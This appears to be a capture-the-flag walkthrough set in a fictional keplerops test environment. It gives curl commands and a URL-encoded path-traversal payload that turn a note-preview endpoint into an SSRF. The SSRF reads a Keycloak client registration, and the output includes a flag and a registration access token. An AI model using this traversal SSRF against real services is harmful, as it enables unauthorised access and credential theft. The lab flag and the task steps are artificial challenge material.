## Get staff directory for support registration ID (K18.1 prerequisite)

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt \
  -H "Authorization: Bearer $(cat ~/.local/share/keplerops/developer-token)" \
  https://staff.keplerops.test/api/service-directory
```

Output: `{"restricted_note":"NOTE-SUP-2841-7","support_registration":"OIDC-FIELDKEST-SUPPORT",...}`

Value used next: `registration=OIDC-FIELDKEST-SUPPORT`

## Find the identity registration path

The identity registration route is the Keycloak Dynamic Client Registration (DCR) endpoint.
Discover it by crawling the linked client references from the service notes entry point.
The identity client reference at `https://identity.keplerops.test/.well-known/fieldkest-client`
exposes the `identity.registration` route template:
`https://identity.keplerops.test/realms/keplerops/clients-registrations/openid-connect/{registration_id}`

## Construct SSRF path (path traversal via note-preview)

The note-preview endpoint validates that `source_path` starts with `/notes/` before decoding.
After URL-decode and normpath, the path resolves to the Keycloak DCR endpoint:

```
/notes/%2e%2e/identity/realms/keplerops/clients-registrations/openid-connect/OIDC-FIELDKEST-SUPPORT
```

## Read registration via note-preview SSRF (K18.2 acceptance check)

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt -X POST \
  -H "Authorization: Bearer $(cat ~/.local/share/keplerops/developer-token)" \
  -H "Content-Type: application/json" \
  --data-binary '{"source_path":"/notes/%2e%2e/identity/realms/keplerops/clients-registrations/openid-connect/OIDC-FIELDKEST-SUPPORT","method":"GET"}' \
  https://staff.keplerops.test/api/note-preview
```

Output: `{"client_id":"OIDC-FIELDKEST-SUPPORT","flag":"FLAG{8978e5b290f6d320}","registration_access_token":"<rat>","registration_client_uri":"https://identity.keplerops.test/realms/keplerops/clients-registrations/openid-connect/OIDC-FIELDKEST-SUPPORT",...}`
